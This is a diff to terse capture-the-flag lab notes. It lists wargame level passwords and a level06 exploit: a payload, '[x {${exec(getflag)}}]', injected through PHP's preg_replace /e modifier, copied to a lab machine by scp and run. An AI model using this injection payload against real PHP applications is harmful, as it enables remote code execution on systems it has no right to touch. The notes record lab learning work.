@@ -88,6 +88,18 @@ level05 -> ne2searoevaevoem4ov4ar8ap
 	flag05 -> X
 
 level06 -> viuaaale9huek52boumoomioc
+	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+	/e -> exploit
+	create file
+	>
+	[x {${exec(getflag)}}]
+	<
+	scp -P 4242 ./php_cmd level06@192.168.1.25:/tmp/php_cmd
+	./level06 /tmp/php_cmd
+
+	flag06 -> X
+
+level07 -> wiok45aaoguiboiki2tuin6ub
 	
 in gdb
 	break system
